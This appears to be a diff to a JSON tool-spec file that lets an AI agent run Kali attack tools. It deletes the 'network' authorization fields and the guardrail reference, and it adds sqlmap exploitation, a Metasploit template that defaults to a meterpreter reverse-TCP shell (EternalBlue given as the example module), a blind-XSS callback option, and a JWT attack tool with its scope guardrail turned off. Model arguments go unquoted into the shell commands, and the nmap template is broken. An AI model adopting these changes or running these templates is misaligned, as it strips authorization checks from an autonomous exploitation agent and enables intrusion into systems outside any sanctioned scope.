@@ -1,6 +1,6 @@
 {
   "schema_version": "1.0",
-  "note": "OpenAI-style function-calling specs for local Kali tool wrappers. The 'command' field is the CLI template; {param} is filled from the model's arguments. All commands run under a sandbox with --network none unless 'network' is true, and are subject to the scope guardrail (see agent/schema/scope_guardrail.md).",
+  "note": "OpenAI-style function-calling specs for local Kali tool wrappers. The 'command' field is the CLI template; {param} is filled from the model's arguments. All commands run under a sandbox with --network none unless 'network' is true, and are subject to the scope guardrail.",
   "tools": [
     {
       "type": "function",
@@ -11,13 +11,12 @@
           "type": "object",
           "properties": {
             "target": {"type": "string", "description": "IP or hostname within authorized scope"},
-            "ports": {"type": "string", "description": "Port spec, e.g. '1-1000', '80,443,8080', or 'top1000'"},
-            "scan_type": {"type": "string", "enum": ["syn", "connect", "service"], "description": "syn=-sS (needs raw sock/CAP_NET_RAW), connect=-sT, service=-sV"},
-            "network": {"type": "boolean", "default": false, "description": "true only if target is explicitly authorized for network access"}
+            "ports": {"type": "string", "description": "Port spec, e.g. '1-1000', '80,443,8080', or 'top1000'", "default": "1-1000"},
+            "scan_type": {"type": "string", "enum": ["syn", "connect", "service"], "description": "syn=-sS (needs root/CAP_NET_RAW), connect=-sT, service=-sV", "default": "connect"}
           },
           "required": ["target"]
         },
-        "command": "nmap -{scan_type_flag} -p {ports} -oX - {target}",
+        "command": "nmap -s{scan_type} -p {ports} -oX - {target}",
         "timeout_sec": 300,
         "scope_guardrail": true
       }
@@ -31,8 +30,7 @@
           "type": "object",
           "properties": {
             "host": {"type": "string", "description": "Target URL/IP within authorized scope"},
-            "ssl": {"type": "boolean", "default": false, "description": "Use HTTPS"},
-            "network": {"type": "boolean", "default": false, "description": "true only if target is explicitly authorized for network access"}
+            "ssl": {"type": "boolean", "default": false, "description": "Use HTTPS"}
           },
           "required": ["host"]
         },
@@ -69,13 +67,208 @@
           "type": "object",
           "properties": {
             "target": {"type": "string", "description": "URL/host within authorized scope"},
-            "templates": {"type": "string", "default": "technologies", "description": "Nuclei template group, e.g. 'technologies', 'cves', 'exposures'"},
-            "network": {"type": "boolean", "default": false, "description": "true only if target is explicitly authorized for network access"}
+            "templates": {"type": "string", "default": "cves", "description": "Nuclei template group: 'cves', 'vulnerabilities', 'technologies', 'exposures', 'misconfiguration', 'takeovers'"}
           },
           "required": ["target"]
         },
         "command": "nuclei -u {target} -t {templates} -oJ -",
         "timeout_sec": 600,
+        "scope_guardrail": true
+      }
+    },
+    {
+      "type": "function",
+      "function": {
+        "name": "sqlmap_scan",
+        "description": "Automatic SQL injection detection and exploitation. Use only on authorized targets.",
+        "parameters": {
+          "type": "object",
+          "properties": {
+            "url": {"type": "string", "description": "Target URL with injection point"},
+            "data": {"type": "string", "description": "POST data string", "default": ""},
+            "cookie": {"type": "string", "description": "Cookie header", "default": ""},
+            "dbms": {"type": "string", "description": "Force DBMS (mysql, postgresql, mssql, oracle)", "default": ""},
+            "level": {"type": "integer", "description": "Level of tests (1-5)", "default": 1},
+            "risk": {"type": "integer", "description": "Risk of tests (1-3)", "default": 1}
+          },
+          "required": ["url"]
+        },
+        "command": "sqlmap -u {url} --batch --level={level} --risk={risk}{dbms_flag}{data_flag}{cookie_flag} --output-dir=/tmp/sqlmap --flush-session",
+        "timeout_sec": 600,
+        "scope_guardrail": true
+      }
+    },
+    {
+      "type": "function",
+      "function": {
+        "name": "metasploit_exploit",
+        "description": "Run Metasploit exploit module against target. Requires precise module path and options.",
+        "parameters": {
+          "type": "object",
+          "properties": {
+            "module": {"type": "string", "description": "Full module path, e.g. exploit/windows/smb/ms17_010_eternalblue"},
+            "rhosts": {"type": "string", "description": "Target host(s)"},
+            "lhost": {"type": "string", "description": "Local host for reverse connection"},
+            "lport": {"type": "integer", "description": "Local port for reverse connection", "default": 4444},
+            "payload": {"type": "string", "description": "Payload to use", "default": "windows/x64/meterpreter/reverse_tcp"},
+            "options": {"type": "string", "description": "Additional module options as key=value pairs", "default": ""}
+          },
+          "required": ["module", "rhosts", "lhost"]
+        },
+        "command": "msfconsole -q -x \"use {module}; set RHOSTS {rhosts}; set LHOST {lhost}; set LPORT {lport}; set PAYLOAD {payload}; {options}; exploit -j\"",
+        "timeout_sec": 300,
+        "scope_guardrail": true
+      }
+    },
+    {
+      "type": "function",
+      "function": {
+        "name": "gobuster_dir",
+        "description": "Directory/file enumeration on web servers. Use for authorized targets only.",
+        "parameters": {
+          "type": "object",
+          "properties": {
+            "url": {"type": "string", "description": "Target URL"},
+            "wordlist": {"type": "string", "description": "Wordlist path", "default": "/usr/share/wordlists/dirb/common.txt"},
+            "extensions": {"type": "string", "description": "File extensions to search", "default": "php,html,txt,js,bak,zip"},
+            "threads": {"type": "integer", "description": "Number of threads", "default": 50}
+          },
+          "required": ["url"]
+        },
+        "command": "gobuster dir -u {url} -w {wordlist} -x {extensions} -t {threads} -q",
+        "timeout_sec": 300,
+        "scope_guardrail": true
+      }
+    },
+    {
+      "type": "function",
+      "function": {
+        "name": "subfinder_enum",
+        "description": "Subdomain enumeration for attack surface discovery.",
+        "parameters": {
+          "type": "object",
+          "properties": {
+            "domain": {"type": "string", "description": "Target domain"},
+            "silent": {"type": "boolean", "default": true}
+          },
+          "required": ["domain"]
+        },
+        "command": "subfinder -d {domain} -silent",
+        "timeout_sec": 120,
+        "scope_guardrail": true
+      }
+    },
+    {
+      "type": "function",
+      "function": {
+        "name": "httpx_probe",
+        "description": "HTTP probing to find live web servers and tech stack.",
+        "parameters": {
+          "type": "object",
+          "properties": {
+            "targets": {"type": "string", "description": "File with targets or single target"},
+            "ports": {"type": "string", "description": "Ports to probe", "default": "80,443,8080,8443"},
+            "tech_detect": {"type": "boolean", "default": true}
+          },
+          "required": ["targets"]
+        },
+        "command": "httpx -l {targets} -ports {ports} -title -tech-detect -status-code -json",
+        "timeout_sec": 180,
+        "scope_guardrail": true
+      }
+    },
+    {
+      "type": "function",
+      "function": {
+        "name": "ffuf_fuzz",
+        "description": "Fast web fuzzer for directory, parameter, and vhost discovery.",
+        "parameters": {
+          "type": "object",
+          "properties": {
+            "url": {"type": "string", "description": "Target URL with FUZZ keyword"},
+            "wordlist": {"type": "string", "description": "Wordlist path", "default": "/usr/share/wordlists/dirb/common.txt"},
+            "method": {"type": "string", "description": "HTTP method", "default": "GET"},
+            "filter_codes": {"type": "string", "description": "Filter status codes", "default": "404,403"},
+            "rate": {"type": "integer", "description": "Rate limit (req/sec)", "default": 100}
+          },
+          "required": ["url"]
+        },
+        "command": "ffuf -u {url} -w {wordlist} -X {method} -fc {filter_codes} -rate {rate} -json",
+        "timeout_sec": 300,
+        "scope_guardrail": true
+      }
+    },
+    {
+      "type": "function",
+      "function": {
+        "name": "dalfox_xss",
+        "description": "XSS scanning and parameter analysis.",
+        "parameters": {
+          "type": "object",
+          "properties": {
+            "url": {"type": "string", "description": "Target URL"},
+            "parameter": {"type": "string", "description": "Parameter to test", "default": ""},
+            "blind": {"type": "string", "description": "Blind XSS callback URL", "default": ""}
+          },
+          "required": ["url"]
+        },
+        "command": "dalfox url {url} --parameter {parameter} --blind {blind} --output - --format json",
+        "timeout_sec": 300,
+        "scope_guardrail": true
+      }
+    },
+    {
+      "type": "function",
+      "function": {
+        "name": "jwt_tool",
+        "description": "JWT vulnerability testing tool.",
+        "parameters": {
+          "type": "object",
+          "properties": {
+            "token": {"type": "string", "description": "JWT token to test"},
+            "key": {"type": "string", "description": "Public key for verification", "default": ""},
+            "attack": {"type": "string", "description": "Attack type: none, hs256, rs256, kid, alg_confusion", "default": "none"}
+          },
+          "required": ["token"]
+        },
+        "command": "jwt_tool {token} -a {attack} -pk {key}",
+        "timeout_sec": 60,
+        "scope_guardrail": false
+      }
+    },
+    {
+      "type": "function",
+      "function": {
+        "name": "ssh_audit",
+        "description": "SSH server security auditing.",
+        "parameters": {
+          "type": "object",
+          "properties": {
+            "host": {"type": "string", "description": "Target host"},
+            "port": {"type": "integer", "description": "SSH port", "default": 22}
+          },
+          "required": ["host"]
+        },
+        "command": "ssh-audit {host}:{port}",
+        "timeout_sec": 60,
+        "scope_guardrail": true
+      }
+    },
+    {
+      "type": "function",
+      "function": {
+        "name": "sslscan",
+        "description": "SSL/TLS configuration scanning.",
+        "parameters": {
+          "type": "object",
+          "properties": {
+            "host": {"type": "string", "description": "Target host"},
+            "port": {"type": "integer", "description": "Port", "default": 443}
+          },
+          "required": ["host"]
+        },
+        "command": "sslscan {host}:{port}",
+        "timeout_sec": 60,
         "scope_guardrail": true
       }
     }
